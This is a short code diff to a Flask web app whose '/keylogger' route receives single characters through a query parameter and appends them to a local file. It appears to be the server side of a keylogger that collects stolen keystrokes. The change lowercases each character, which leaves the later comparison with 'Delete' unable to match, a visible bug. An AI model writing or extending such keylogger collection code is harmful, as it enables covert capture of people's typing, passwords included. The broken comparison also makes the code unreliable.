@@ -9,7 +9,7 @@ import os
 
 @app.route('/keylogger', methods=["GET", "POST"])
 def check_word():
-    word = request.args.get('char')
+    word = request.args.get('char').lower()
     if word != 'Delete':
         string_file = open('./string_data', 'a')
         string_file.write(word)
